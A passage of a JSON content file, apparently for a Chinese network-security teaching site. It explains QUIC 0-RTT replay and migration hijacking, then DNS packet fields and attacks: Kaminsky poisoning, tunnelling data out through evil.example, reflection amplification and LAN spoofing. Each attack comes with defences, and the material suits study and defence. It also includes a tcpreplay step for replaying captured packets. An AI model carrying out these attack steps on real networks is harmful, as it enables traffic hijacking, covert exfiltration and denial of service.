NewSessionTicket"},"say":"首次连接完成后，服务器在 CRYPTO 帧里下发票据与 max_early_data_size。","sub":"票据与 early secret 被缓存，early key 由 PSK 派生。"},{"who":"客户端","to":"服务器","pkt":0,"bubble":"0-RTT 包","hl":["Header Form + Fixed Bit + Type + Reserved + PN Len","Packet Number"],"vals":{"Header Form + Fixed Bit + Type + Reserved + PN Len":"长首部，类型 01 = 0-RTT","Packet Number":"0x00000001"},"say":"下一条连接：Initial 里带 early_data，紧接着就发 0-RTT 包。","sub":"0-RTT 用 early key 加密，旁观者解不开，但整包可以照抄。"},{"who":"攻击者","to":"—","pkt":0,"bubble":"存包","evil":true,"hl":["Destination Connection ID","Length"],"vals":{"Destination Connection ID":"必须留着，否则服务器找不到连接","Length":"原样不动"},"say":"抓包只要两样：DCID 与整包字节，重放时一个都不能改。","sub":"UDP 无状态，抓包与重放的成本都低到可以脚本化。"},{"who":"攻击者","to":"服务器","pkt":0,"bubble":"原样重放","evil":true,"hl":["Packet Number","Length"],"vals":{"Packet Number":"包号复用","Length":"字节不变"},"say":"服务器用同一 PSK 派生同一 early key，AEAD 校验必然通过。","sub":"0-RTT 包是长首部，包号明文可见，但协议层没有全局重放窗口。"},{"who":"服务器","to":"应用","pkt":1,"bubble":"提前交付","hl":["Frames"],"vals":{"Frames":"STREAM(id=0) 载荷是 POST 表单"},"say":"STREAM 帧在握手完成前就交给应用：请求被第二次执行。","sub":"此时服务器还没验证身份，也分不清这是新请求还是重放。"}],"cmds":{"linux":[{"c":"sudo tcpdump -ni any -w quic.pcap 'udp port 443'","n":"存下整条会话；长首部包一眼可辨（首字节高位为 1）","s":"补充（抓包必备）"},{"c":"sudo tcpreplay -i eth0 quic.pcap","n":"按原字节重放 0-RTT 包，观察服务端是否重复执行","s":"补充（tcpreplay 不在 vault）"},{"c":"curl --http3 -v https://cloudflare-quic.com -o /dev/null","n":"curl 默认不发 0-RTT：要观察重放得自己构造包或改客户端","s":"补充（curl 的 HTTP/3 需单独编译）"}],"ps":[{"c":"Get-NetUDPEndpoint | Measure-Object | Select-Object Count","n":"UDP 端点数量的异常波动可作为重放或扫描的侧影","s":"《系统》PowerShell.md · 网络管理 Cmdlet"},{"c":"Test-NetConnection cloudflare-quic.com -Port 443 -InformationLevel Detailed","n":"先确认基础通路，UDP 是否放行要另行验证","s":"《系统》PowerShell.md · Test-NetConnection"}],"cmd":[{"c":"curl --http3 -v https://cloudflare-quic.com -o NUL","n":"确认客户端侧 QUIC 可用，再谈重放实验","s":"补充（Windows 内置 curl 通常无 HTTP/3）"},{"c":"netstat -ano -p UDP | findstr :443","n":"同一 PID 反复出现新的 UDP 443 记录，值得核对","s":"《系统》Windows CMD.md · netstat"}]}},{"name":"连接迁移劫持：拿到 CID 就当自己是客户端","steps":[{"who":"攻击者","to":"—","pkt":1,"bubble":"嗅探","evil":true,"hl":["Destination Connection ID","Packet Number"],"vals":{"Destination Connection ID":"8 字节，短首部里是明文","Packet Number":"被首部保护掩码"},"say":"短首部里只有 CID 与（被掩码的）包号：拿到 CID 就拿到连接身份。","sub":"地址不再是身份的一部分，这既是迁移的前提，也是劫持的入口。"},{"who":"攻击者","to":"服务器","pkt":1,"bubble":"同 CID 的包","evil":true,"hl":["Destination Connection ID"],"vals":{"Destination Connection ID":"照抄"},"say":"攻击者从自己的地址发出携带同一 CID 的包，假装客户端换了地址。","sub":"服务端按 CID 找到连接，发现源地址变了，就按迁移逻辑处理。"},{"who":"服务器","to":"攻击者地址","pkt":1,"bubble":"PATH_CHALLENGE","hl":["Frames"],"vals":{"Frames":"PATH_CHALLENGE（8 字节随机）"},"say":"服务端先在新路径上发挑战：有这一步，劫持才有门槛。","sub":"若实现跳过验证直接迁移，后面两步全省了，攻击立即成功。"},{"who":"攻击者","to":"服务器","pkt":1,"bubble":"PATH_RESPONSE","evil":true,"hl":["Frames"],"vals":{"Frames":"PATH_RESPONSE 回显那 8 字节"},"say":"挑战收得到就答得上：路径验证证明「可达」，不证明「同一人」。","sub":"能收到挑战说明路径是通的，这正是路径验证的天花板。"},{"who":"服务器","to":"攻击者","pkt":1,"bubble":"切路径","hl":["Destination Connection ID","Frames"],"vals":{"Destination Connection ID":"不变","Frames":"下行 STREAM 全发往新地址"},"say":"发送路径切到攻击者地址，真客户端只看到自己的连接慢慢超时。","sub":"攻击者站在路径中间：可以转发、可以挑着丢，也可以直接黑洞。"}],"cmds":{"linux":[{"c":"sudo tcpdump -ni any 'udp port 443 and udp[1:4] = 0x00000001'","n":"只抓 QUIC v1 长首部包（版本在偏移 1），看清握手起点","s":"补充（抓包必备）"},{"c":"sudo tcpdump -ni any -A 'udp port 443' | grep -a 'CHALLENGE'","n":"粗看是否出现路径验证帧；没有就说明服务端可能根本没验证","s":"补充（抓包必备）"},{"c":"ss -uanp | grep ':443'","n":"本机 QUIC 连接对应的进程，判断是不是自己的客户端在迁移","s":"《系统》Linux.md · ss"}],"ps":[{"c":"Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,InterfaceAlias","n":"切换网卡时核对出口 IP，是迁移实验的起点","s":"《系统》PowerShell.md · Get-NetIPAddress"},{"c":"Get-NetUDPEndpoint -LocalPort 443","n":"本机作为服务端时的 QUIC 监听端点","s":"《系统》PowerShell.md · 网络管理 Cmdlet"}],"cmd":[{"c":"ipconfig","n":"看地址与默认网关，确认是否真的换了出口","s":"《系统》Windows CMD.md · ipconfig"},{"c":"netstat -ano -p UDP | findstr :443","n":"迁移前后应仍是同一条 UDP 会话（本机端口不变）","s":"《系统》Windows CMD.md · netstat"}]}}]},{"key":"defend","no":"第 3 幕","title":"防护在哪一步掐断它","desc":"同一场重放与同一场迁移各重来一遍：一个卡在业务白名单，一个卡在路径验证","lead":"0-RTT 的抗重放只能建在业务层；迁移劫持的防护则全看路径验证做没做。","scenes":[{"name":"幂等白名单 + 票据去重，迁移必须过挑战","steps":[{"who":"攻击者","to":"服务器","pkt":0,"bubble":"重放 0-RTT","evil":true,"hl":["Payload / CRYPTO Frame"],"vals":{"Payload / CRYPTO Frame":"同一段 CRYPTO 与 STREAM 字节"},"say":"重放照旧：同一张票据、同一段 0-RTT 字节，一个不改。","sub":"防护要让这次重放找不到可执行的东西，而不是让它发不出来。"},{"who":"服务器","to":"—","pkt":0,"bubble":"只收幂等","hl":["Payload / CRYPTO Frame","Token Length"],"vals":{"Payload / CRYPTO Frame":"POST 不在白名单 → 不收 0-RTT","Token Length":"要求先完成 1-RTT"},"say":"只对幂等请求开 early data：写操作一律退回 1-RTT 再执行。","sub":"省下的那个 RTT，不值得用「重复扣款」去换。"},{"who":"服务器","to":"—","pkt":0,"bubble":"票据单次","hl":["Payload / CRYPTO Frame"],"vals":{"Payload / CRYPTO Frame":"票据单次使用，请求指纹跨节点去重"},"say":"票据用一次即作废，再用请求指纹在共享存储里去重。","sub":"多节点必须共享去重状态，否则每个节点各执行一次。"},{"who":"攻击者","to":"服务器","pkt":1,"bubble":"伪迁移","evil":true,"hl":["Destination Connection ID"],"vals":{"Destination Connection ID":"照抄受害者连接的 CID"},"say":"接着试迁移：从自己的地址发携带受害者 CID 的短首部包。","sub":"这次服务端先看传输参数，再决定理不理它。"},{"who":"服务器","to":"攻击者地址","pkt":1,"bubble":"先验证","hl":["Frames"],"vals":{"Frames":"PATH_CHALLENGE，验证前不切路径"},"say":"迁移必须先过 PATH_CHALLENGE；disable_active_migration 可禁被动迁移。","sub":"验证只证明可达性，不证明身份，所以还要配合 CID 轮换。"},{"who":"服务器","to":"—","pkt":0,"bubble":"3× + 轮换","hl":["Length","Source Connection ID"],"vals":{"Length":"地址验证前 ≤ 收包量 3 倍","Source Connection ID":"定期轮换，抗跨连接关联"},"say":"地址验证前发送量卡在 3 倍，CID 定期轮换让旁观者串不起多条连接。","sub":"3× 只压低单点放大，分布式聚合还要靠 BCP38 从源头断。"}],"cmds":{"linux":[{"c":"sudo tcpdump -ni any 'udp port 443' -c 50","n":"取 50 个包快速看：0-RTT 与重放包在长首部里形态完全一致","s":"补充（抓包必备）"},{"c":"sudo iptables -A INPUT -p udp --dport 443 -m limit --limit 200/sec -j ACCEPT","n":"按速率兜底限流；QUIC 合法突发大，阈值必须实测后再定","s":"补充（iptables 不在 vault）"},{"c":"curl --http3 -sv https://cloudflare-quic.com -o /dev/null","n":"防护后复测：正常 HTTP/3 访问必须仍然可用","s":"补充（curl 的 HTTP/3 需单独编译）"}],"ps":[{"c":"New-NetFirewallRule -DisplayName 'QUIC-UDP-443' -Direction Inbound -Protocol UDP -LocalPort 443 -Action Allow","n":"只放行必要的 UDP 443，其余 UDP 入向一律拒","s":"《系统》PowerShell.md · 网络管理 Cmdlet"},{"c":"Get-NetUDPEndpoint -LocalPort 443","n":"复核监听仍在、且只有一个服务占用","s":"《系统》PowerShell.md · 网络管理 Cmdlet"}],"cmd":[{"c":"netsh advfirewall firewall add rule name=\"QUIC-UDP-443\" dir=in action=allow protocol=UDP localport=443","n":"与图形界面等价的放行规则","s":"《系统》Windows CMD.md · netsh"},{"c":"netstat -ano -p UDP | findstr :443","n":"复查 UDP 443 的连接数是否回到正常水平","s":"《系统》Windows CMD.md · netstat"}]}}]}]}},{"proto":{"id":"dns","name":"DNS","cn":"域名系统","en":"Domain Name System","layer":"application","chapter":"第五章","extra":false,"oneLine":"把域名翻译成 IP 的分布式数据库，而证明“这条应答是我的”只有一个 16 位 ID——整条信任链最薄的一环。","sections":[{"h":"名字与地址解耦，映射本身就成了攻击靶心","p":"用户记住域名，网络只认 IP，DNS 负责在两者之间做转换。这个解耦让服务可以换机房、换运营商而不换名字，但也让“名字→地址”这一步成为独立可攻击的对象：攻击者不必攻破目标服务器，只要让解析返回错误答案，用户就会自愿带着凭据走进攻击者的机器。\n\n解析由本地域名服务器（LDNS）代跑：主机到 LDNS 用递归（一次委托，等最终结果），LDNS 到根、顶级域、权威服务器用迭代（一问一答，只告诉你下一步该问谁）。之所以不让根服务器做递归，是因为全球查询量集中在顶层既不可扩展，也无法承载——递归的负担必须下放到离用户最近的 LDNS。"},{"h":"12 字节首部：只有 ID 与标志决定这条应答算不算数","p":"首部固定 12 字节，依次是 16 位标识、16 位标志、问题数、回答数、授权数、附加数各 16 位，随后才是四个变长区。标志字段第 0 位 QR 区分查询与响应，其后是 4 位 Opcode、AA（权威）、TC（截断）、RD（期望递归）、RA（支持递归）、3 位 Z 与 4 位 RCODE。\n\n接收方判断“这是不是我要的答案”，依据只有三个可猜测的量：源 IP、目的端口、这个 16 位 ID。协议里没有任何密码学凭据，因此“响应合法性”在设计上就等于“三元组对上”。这也是为什么随机化源端口会被当作安全补丁——它不在原设计里。"},{"h":"问题区用长度前缀拼域名，压缩指针省字节也藏风险","p":"QNAME 不是点分字符串，而是一串“长度字节+标签”，末字节 0x00 表示根。QTYPE 与 QCLASS 各 2 字节：A=1、NS=2、CNAME=5、SOA=6、PTR=12、MX=15、AAAA=28、ANY=255，CLASS 通常是 IN=1。资源记录统一为 NAME/TYPE/CLASS/TTL/RDLENGTH/RDATA 六段结构，答案区里的 NAME 常用 0xC0 开头的两字节压缩指针指回问题区，省掉重复的域名。\n\n压缩指针只规定“指向报文内某处”，没有规定“只能指向哪里”。历史上多处解析器漏洞就出在这里：指针指到报文外造成越界读，指针互指造成死循环耗尽 CPU。省字节的优化在实现层变成了新的攻击面。"},{"h":"缓存把一次欺骗放大成一群人的欺骗","p":"LDNS 命中缓存就直接返回，不再向上游核对。这条优化是性能的关键，也是投毒攻击的全部价值所在：一条被写入的错误记录，会在 TTL 有效期内无差别地发给该 LDNS 背后的所有用户。攻击者付出的成本是一次抢答，收获的是一整片用户的流量。\n\n因此 TTL 的取值本身就是安全参数。权威侧通常给易变的 A 记录 300~600 秒、给稳定的 NS 记录 172800 秒，遵循“越靠右的层级越少变化”的规律。反过来，任何声称自己只有几十秒 TTL 却缓存两天的行为，都是伪造报文的强特征。"},{"h":"EDNS(0) 抬高了 UDP 载荷上限，也抬高了放大倍数","p":"传统 DNS over UDP 受 512 字节限制，超长响应只能把 TC 置 1，让客户端改走 TCP 重查。EDNS(0) 在附加区放一条 TYPE=41 的 OPT 伪记录，借用 RR 的字段位表达能力：CLASS 字段变成“请求方 UDP 载荷大小”（常见 4096），TTL 字段被切成扩展 RCODE、版本号与 DO 位。\n\n上限抬高后，一条几十字节的查询可以换来数 KB 应答，反射放大的倍数随之上升。这不是 EDNS 的缺陷，而是“用别人的服务器放大流量”这一攻击模式天然会去挑最大号的响应。所以现代权威服务器对 ANY 查询做最小化应答，并在响应体积上设阈值。"},{"h":"签名、加密、限流补的不是同一个洞","p":"DNSSEC 解决“这条记录是不是权威签发的”：对 RRset 做散列、私钥签名、公钥验证，同时用 NSEC/NSEC3 证明“不存在”，但报文内容仍是明文。DoT 把整个 DNS 报文塞进 TLS 记录、走 853 端口，用 PKI 证书链建立信任，端口固定因此可被网络管理员识别与放行。DoH 把查询伪装成普通 HTTPS，穿透性最强，代价是企业失去 DNS 可见性。\n\n三者都不改变“解析结果决定你连向谁”这个事实。所以真正的最后一道防线是端点的证书校验：无论中间的名字解析被怎么摆布，HTTPS 都能让浏览器发现“这个站的证书不是它的”。这也是应用层加密比链路加密更根本的原因。"}],"packets":[{"title":"DNS 查询报文：12 字节首部 + 问题区（30 字节）","note":"以 LDNS 代主机发起的一次 A 记录标准查询为例，RD=1 表示期望递归","hex":"1a 2b 01 00 00 01 00 00 00 00 00 00 03 77 77 77 05 62 61 6e 6b 03 63 6f 6d 00 00 01 00 01","fields":[{"name":"ID","cn":"事务标识","off":0,"len":2,"bits":"","tone":"id","desc":"16 位事务标识，由查询方生成，应答必须原样复制。接收方靠它把一条响应与某个待决查询配对——这是整个协议唯一的“血缘证明”。取值空间只有 65536，攻击者平均发 32768 条候选就能命中一次。","sec":"Kaminsky 攻击的全部成本就是猜这个字段。若实现用递增计数器而非强随机数生成 ID，猜测会退化到个位数次；这也是“熵不足”在协议层的经典案例。"},{"name":"Flags","cn":"标志","off":2,"len":2,"bits":"bit0 QR / bit1-4 Opcode / bit5 AA / bit6 TC / bit7 RD / bit8 RA / bit9-11 Z / bit12-15 RCODE","tone":"flag","desc":"0x0100 逐位解读：QR=0（这是查询）、Opcode=0000（标准查询）、AA=0、TC=0、RD=1（期望递归）、RA=0、Z=000、RCODE=0000。响应中同一字段会被改写为 0x8180 之类的值。","sec":"攻击者可置 RCODE=3（NXDOMAIN）让客户端相信域名不存在，实施“否认域名存在”；置 TC=1 则可迫使客户端降级到更易被劫持的通道。"},{"name":"QDCOUNT","cn":"问题数","off":4,"len":2,"bits":"","tone":"count","desc":"问题区条目数。标准查询恒为 1；若声明数与实际条目不符，解析器会报格式错误或按截断处理。","sec":"本字段在常见攻击中不作为独立手段，但计数与实际不符是畸形报文检测的特征之一。"},{"name":"ANCOUNT","cn":"回答数","off":6,"len":2,"bits":"","tone":"count","desc":"答案区条目数。查询报文为 0；响应中声明直接回答的记录条数。","sec":"伪造响应时攻击者常把这里置 0（它不知道真实 A 记录），转而把内容塞进授权区——这个“答不上来”的特征正是 Kaminsky 报文的指纹。"},{"name":"NSCOUNT","cn":"授权数","off":8,"len":2,"bits":"","tone":"count","desc":"授权区条目数，声明与查询域相关的权威域名服务器记录条数。","sec":"Kaminsky 攻击的注入点：把 NS 记录塞进授权区，等于“我问你 A，你却教会我 B 域的权威是谁”，解析权由此被移交。"},{"name":"ARCOUNT","cn":"附加数","off":10,"len":2,"bits":"","tone":"count","desc":"附加区条目数，通常是授权区中 NS 对应的 A 记录，省掉一轮额外查询；启用 EDNS(0) 后此处至少为 1（OPT 伪记录）。","sec":"附加区异常偏大是反射放大与隧道流量的共同特征：一条小查询带出数 KB 应答。"},{"name":"QNAME","cn":"查询域名","off":12,"len":14,"bits":"","tone":"name","desc":"域名不是点分字符串，而是一串“长度字节+标签”：0x03 'www' 0x05 'bank' 0x03 'com' 0x00，末尾的 0x00 是根标签。单标签≤63 字节，全名≤255 字节，总长限制决定了隧道能塞多少数据。","sec":"隧道攻击把待传数据 base32 编码后切成标签放进这里，因为防火墙几乎不会拦超长域名；标签长度接近 63、熵值异常高是它的形状特征。"},{"name":"QTYPE","cn":"查询类型","off":26,"len":2,"bits":"","tone":"type","desc":"2 字节资源类型：A=1、NS=2、CNAME=5、SOA=6、PTR=12、MX=15、AAAA=28、ANY=255。本例 0x0001 查询 IPv4 地址。","sec":"QTYPE=ANY(255) 且 QNAME 指向大区域，是反射放大最廉价的选择：一次查询换回全部记录。因此现代权威服务器对 ANY 做最小化应答。"},{"name":"QCLASS","cn":"查询类","off":28,"len":2,"bits":"","tone":"class","desc":"2 字节查询类，1=IN 表示 Internet。另有 CH（Chaos）等极少使用。","sec":"本字段在常见攻击中不作为独立手段；但异常的 CLASS 会被部分解析器误解析为其他记录，历史上出现过由此绕过过滤的案例。"}]},{"title":"DNS 响应报文：答案区一条 A 记录（46 字节，含名字压缩指针）","note":"QR=1、AA=1、RA=1，问题区原样回显，答案区用 0xC00C 指回问题名以省字节","hex":"1a 2b 81 80 00 01 00 01 00 00 00 00 03 77 77 77 05 62 61 6e 6b 03 63 6f 6d 00 00 01 00 01 c0 0c 00 01 00 01 00 00 01 2c 00 04 c0 a8 01 0a","fields":[{"name":"ID","cn":"事务标识","off":0,"len":2,"bits":"","tone":"id","desc":"与查询完全一致，客户端据此确认“这是我的答案”。","sec":"投毒能否成功，唯一门槛就是让这里与被劫持查询的 ID 相同；端口、ID、源地址三项都对上，客户端无从分辨真假。"},{"name":"Flags","cn":"标志","off":2,"len":2,"bits":"bit0 QR / bit1-4 Opcode / bit5 AA / bit6 TC / bit7 RD / bit8 RA / bit9-11 Z / bit12-15 RCODE","tone":"flag","desc":"0x8180：QR=1（响应）、Opcode=0、AA=1（权威回答）、TC=0、RD=1（原查询要求递归）、RA=1（本服务器支持递归）、RCODE=0（无错误）。","sec":"AA=1 具有欺骗价值：客户端更信任“权威”回答。伪造报文时把 AA 置 1，可提高被接受的概率。"},{"name":"QDCOUNT","cn":"问题数","off":4,"len":2,"bits":"","tone":"count","desc":"回显 1 条问题，内容与查询逐字节一致。","sec":"解析器会用问题区与待决查询做一致性比对，所以伪造报文必须把 QNAME 写对——这是攻击者唯一必须“答对”的地方。"},{"name":"ANCOUNT","cn":"回答数","off":6,"len":2,"bits":"","tone":"count","desc":"1 条答案记录。","sec":"把这里写成 1 但答案区实际为空，会让部分宽松实现读出越界数据。"},{"name":"NSCOUNT","cn":"授权数","off":8,"len":2,"bits":"","tone":"count","desc":"本例无授权记录（答案已完整）。","sec":"只指路不给答案的响应（ANCOUNT=0、NSCOUNT>0）是“解析权移交”的形态，也是被伪造的首要目标。"},{"name":"ARCOUNT","cn":"附加数","off":10,"len":2,"bits":"","tone":"count","desc":"本例无附加记录。","sec":"接上 EDNS 后此处为 1；若把 OPT 之外的无关记录混入附加区，可绕过某些只校验问题区的过滤器。"},{"name":"QNAME","cn":"查询域名","off":12,"len":14,"bits":"","tone":"name","desc":"原样回显的域名，与前一条报文逐字节相同。","sec":"0x20 编码防御在这里生效：若查询时随机改变字母大小写，伪造者必须猜中每一位的大小写。"},{"name":"QTYPE","cn":"查询类型","off":26,"len":2,"bits":"","tone":"type","desc":"回显 0x0001（A）。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"QCLASS","cn":"查询类","off":28,"len":2,"bits":"","tone":"class","desc":"回显 0x0001（IN）。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"NAME","cn":"记录名（压缩指针）","off":30,"len":2,"bits":"","tone":"name","desc":"答案记录的属主名。两个高位为 1 表示这是压缩指针，低 14 位 0x000C=12 指向报文第 12 字节处的问题名，用 2 字节代替 14 字节的完整域名。","sec":"压缩指针可指向报文任意位置，历史漏洞多出于此：越界解引用导致崩溃泄漏内存，或构造指针环使解析器陷入死循环（放大 CPU 消耗）。"},{"name":"TYPE","cn":"资源类型","off":32,"len":2,"bits":"","tone":"type","desc":"0x0001 = A，说明 RDATA 是 4 字节 IPv4 地址。","sec":"记录类型决定了 RDATA 的解释方式，类型与长度不匹配是畸形包检测点。"},{"name":"CLASS","cn":"资源类","off":34,"len":2,"bits":"","tone":"class","desc":"0x0001 = IN。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"TTL","cn":"生存时间","off":36,"len":4,"bits":"","tone":"ttl","desc":"0x0000012C = 300 秒，声明这条记录可被缓存 5 分钟。","sec":"TTL 直接标定投毒的攻击收益：写得越长，一次命中的劫持时长越久。攻击者伪造报文时常填 172800（两天）——远超正常 A 记录的取值范围，是可检测的异常。"},{"name":"RDLENGTH","cn":"数据长度","off":40,"len":2,"bits":"","tone":"len","desc":"RDATA 的字节数，A 记录固定为 4。","sec":"RDLENGTH 与实际 RDATA 不符会被用于制造越界读取；也是 DNS 隧道检测的特征位（异常大的 RDLENGTH 配合 TXT/NULL 类型）。"},{"name":"RDATA","cn":"记录数据","off":42,"len":4,"bits":"","tone":"data","desc":"0xC0A8010A = 192.168.1.10。这就是用户最终会连过去的地址。","sec":"把这里改成攻击者 IP，一次解析劫持即完成；整个 DNS 安全体系要守的就是这 4 个字节。"}]},{"title":"EDNS(0)：附加区里的 OPT 伪记录（41 字节）","note":"同一次查询，ARCOUNT=1，附加区追加一条 TYPE=41 的伪记录，用 RR 的字段位借位表达能力","hex":"1a 2b 01 00 00 01 00 00 00 00 00 01 03 77 77 77 05 62 61 6e 6b 03 63 6f 6d 00 00 01 00 01 00 00 29 10 00 00 00 80 00 00 00","fields":[{"name":"ID","cn":"事务标识","off":0,"len":2,"bits":"","tone":"id","desc":"与普通查询相同，EDNS 不改变事务标识语义。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"Flags","cn":"标志","off":2,"len":2,"bits":"bit0 QR / bit1-4 Opcode / bit5 AA / bit6 TC / bit7 RD / bit8 RA / bit9-11 Z / bit12-15 RCODE","tone":"flag","desc":"仍为 RD=1 的标准查询，EDNS 通过附加区而非标志位协商。","sec":"若 EDNS 协商失败（服务器不认识 OPT），响应会带 RCODE=BADVERS(16) 或直接丢弃，客户端需回退——这一回退路径可被利用做降级。"},{"name":"QDCOUNT","cn":"问题数","off":4,"len":2,"bits":"","tone":"count","desc":"问题区仍为 1 条。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"ANCOUNT","cn":"回答数","off":6,"len":2,"bits":"","tone":"count","desc":"查询报文无答案。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"NSCOUNT","cn":"授权数","off":8,"len":2,"bits":"","tone":"count","desc":"查询报文无授权记录。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"ARCOUNT","cn":"附加数","off":10,"len":2,"bits":"","tone":"count","desc":"置 1，声明附加区有一条记录——这就是 EDNS 的载体。老式解析器看到不认识的附加记录通常会忽略，因此 EDNS 具备向后兼容性。","sec":"反向利用：把恶意数据伪装成“不认识的附加记录”，中间设备忽略而终端解析，形成解析器差异。"},{"name":"QNAME","cn":"查询域名","off":12,"len":14,"bits":"","tone":"name","desc":"与普通查询相同的长度前缀编码。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"QTYPE","cn":"查询类型","off":26,"len":2,"bits":"","tone":"type","desc":"仍是 A 记录查询。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"QCLASS","cn":"查询类","off":28,"len":2,"bits":"","tone":"class","desc":"仍是 IN。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"NAME","cn":"OPT 属主名","off":30,"len":1,"bits":"","tone":"name","desc":"固定为根（单个 0x00），OPT 记录不能有其他属主名。","sec":"属主名非根会被合规解析器判为格式错误——这一严格性可用于过滤伪造的 EDNS 应答。"},{"name":"TYPE","cn":"伪记录类型","off":31,"len":2,"bits":"","tone":"type","desc":"0x0029 = 41，即 OPT。它不是一个查询类型，而是“能力信封”。","sec":"过滤设备若只认 A/AAAA/NS 而对 41 放行，就会漏掉藏在 OPT 选项里的数据（如 ECS 携带的客户端子网）。"},{"name":"CLASS","cn":"UDP 载荷大小","off":33,"len":2,"bits":"","tone":"len","desc":"0x1000 = 4096。RR 的 CLASS 字段在此被借用来声明请求方愿意接收的最大 UDP 载荷，突破传统 512 字节限制。","sec":"上限从 512 抬到 4096，反射放大倍数随之上升约 8 倍；这正是放大攻击要求“带 EDNS 的开放递归”的原因。"},{"name":"TTL","cn":"扩展 RCODE / 版本 / 标志","off":35,"len":4,"bits":"byte0 扩展RCODE / byte1 版本 / byte2-3 bit0 DO + 15 位 Z","tone":"flag","desc":"4 字节被切成三段：高 8 位扩展 RCODE（与首部 4 位拼成 12 位）、次 8 位 EDNS 版本（0），低 16 位中最高位为 DO（DNSSEC OK），本例置 1 表示请求方支持 DNSSEC 记录。","sec":"DO=1 会换来含 RRSIG 的大应答，是放大攻击的“放大器开关”；若响应方在未请求时强行塞入大量 DNSSEC 记录，则是明显的滥用。"},{"name":"RDLENGTH","cn":"选项区长度","off":39,"len":2,"bits":"","tone":"len","desc":"本例 0，表示不含任何 EDNS 选项（如 ECS、Cookie）。","sec":"EDNS Client Subnet、EDNS Cookie 等选项携带额外信息，长度异常或内容异常可作为隧道检测依据。"}]}],"attacks":[{"name":"Kaminsky Cache Poisoning","cn":"Kaminsky 缓存投毒","impact":"LDNS 缓存被写入伪造的 NS/A 记录，TTL 内该解析器的所有用户被持续导向攻击者主机","steps":[{"who":"攻击者","to":"本地 DNS 服务器","label":"查询 a1b2c3.bank.example A IN，ID=0x1a2b，RD=1","note":"随机子域必然不存在，真实应答必为 NXDOMAIN；LDNS 由此进入“等待响应”状态"},{"who":"本地 DNS 服务器","to":"bank.example 权威服务器","label":"迭代查询 NS，源端口 40000，ID=0x1a2b","note":"攻击者从旁路看到这次查询，得知当前在用的 ID 与端口范围"},{"who":"攻击者","to":"本地 DNS 服务器","label":"伪造响应，ID 从 0x0000 枚举到 0xffff，源端口伪造为 40000","note":"与真实应答赛跑；每秒数十万包时，65536 个 ID 只需不到一秒扫完"},{"who":"攻击者","to":"本地 DNS 服务器","label":"报文内容：ANCOUNT=0、NSCOUNT=1 授权区写 bank.example NS ns.evil.example、ARCOUNT=1 附加区写 ns.evil.example A 6.6.6.6","note":"答案区故意留空（它并不知道真实 A 记录），改用名字连锁：让解析器连“某域权威是谁”一起学走"},{"who":"本地 DNS 服务器","to":"自身缓存","label":"接受响应，缓存 NS 与 A，TTL 取报文声明的 172800","note":"缓存状态被改写为“整个 bank.example 归 ns.evil.example 管”，持续两天"},{"who":"受害者","to":"本地 DNS 服务器","label":"查询 www.bank.example A，命中被污染的缓存","note":"返回 6.6.6.6；单次抢答放大为全体用户、持续两天的劫持"}],"defense":"随机化查询源端口与问题名大小写抬高熵值，并拒绝缓存与问题无直接关系的授权/附加记录；根治要等 DNSSEC 铺开。"},{"name":"DNS Tunneling","cn":"DNS 隧道（隐蔽信道）","impact":"在只放行 53 端口的网络里建立长期双向通道，用于外传数据与下发指令","steps":[{"who":"受控主机","to":"企业 DNS 服务器","label":"A 查询，QNAME=<base32(40 字节数据)>.t.evil.example，标签长度逼近 63","note":"数据被切片塞进域名；标签长度与整名 255 字节的上限决定了每包能带多少"},{"who":"企业 DNS 服务器","to":"攻击者权威服务器","label":"迭代查询转发至 ns.evil.example，源端口随机","note":"企业解析器成了免费的转发器，它并不区分这是业务查询还是隧道"},{"who":"攻击者权威","to":"企业 DNS 服务器","label":"应答 TXT 记录，RDATA 中放 base64 指令，TTL=0","note":"下行指令搭同一条查询的应答回来，全程不新建连接、不触发入站策略"},{"who":"企业 DNS 服务器","to":"受控主机","label":"递归应答返回 TXT 内容","note":"受控主机解出指令并执行，上行结果再按下一次查询带出"},{"who":"受控主机","to":"攻击者权威服务器","label":"以固定间隔重复，日均搬运数 MB","note":"通道长期存活；端口封禁、协议白名单对它完全无效"}],"defense":"在解析出口做形状检测——超长标签、高熵子域、TXT/NULL 记录频次异常、单一权威域名的高频查询——并阻断已知隧道域名。"},{"name":"DNS Reflection Amplification","cn":"DNS 反射放大","impact":"以极小成本把数十 Gbps 流量压向受害者出口，造成链路级拒绝服务","steps":[{"who":"攻击者","to":"开放递归服务器","label":"伪造源 IP=受害者地址，发送 42 字节 ANY 查询，QNAME 指向记录量大的区域","note":"UDP 无握手，源地址完全由攻击者填写，反射器无从核实"},{"who":"开放递归服务器","to":"受害者","label":"返回含大量记录与 EDNS OPT 的 3000~4000 字节应答","note":"放大倍数约 70~100 倍；EDNS 把上限从 512 抬到 4096 后倍数更高"},{"who":"攻击者","to":"开放递归服务器","label":"更换反射器与受害者端口，重复数十万次","note":"反射器池越大，受害者越难按源 IP 做临时封禁"},{"who":"受害者","to":"上游 ISP","label":"出口链路拥塞，正常请求无法返回","note":"攻击者实际消耗的带宽比打出的流量低两个数量级"}],"defense":"关闭开放递归（只服务授权网段），并在网络入口实施 BCP38 源地址校验，让伪造源地址的报文根本出不了自己的网络。"},{"name":"Intra-domain Redirect","cn":"域内重定向（局域网伪造应答）","impact":"同一局域网内的攻击者无需接触任何上游服务器，即可把受害者的解析结果改成自己的机器","steps":[{"who":"攻击者","to":"受害者","label":"ARP 应答宣称 192.168.0.254（默认网关）对应攻击者 MAC","note":"受害者 ARP 表被覆盖，后续所有出网流量先经过攻击者"},{"who":"受害者","to":"攻击者（被当作网关）","label":"DNS 查询 www.bank.example，ID=0x1a2b，源端口 53124","note":"攻击者在路径中间，明文问题、ID 与端口全部可见"},{"who":"攻击者","to":"受害者","label":"立即回伪造应答，ID 与端口完全一致，答案区 A 记录=192.168.0.66","note":"无需猜 ID——它直接读到了；抢在真实应答之前返回，命中率接近 100%"},{"who":"受害者","to":"192.168.0.66","label":"HTTP 请求，Host: 